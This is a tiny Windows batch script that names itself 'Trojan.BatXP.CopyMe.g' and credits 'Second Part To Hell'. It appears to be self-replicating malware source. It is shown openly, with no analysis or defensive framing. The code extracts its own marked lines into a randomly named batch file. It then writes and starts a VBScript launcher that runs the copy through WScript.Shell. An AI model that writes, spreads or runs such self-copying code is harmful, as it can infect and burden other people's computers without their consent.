ReM Trojan.BatXP.CopyMe.g
ReM by Second Part To Hell %CopyMe%
%CopyMea%set cmg=%random%%random%
find "CopyMe"<%0>%cmg%.bat
set CopyMe=cmg.vbs
echo set shell=Wscript.CreateObject ("Wscript.Shell") >%CopyMe%
echo shell.Run "%cmg%.bat" >>%CopyMe%
start %CopyMe%
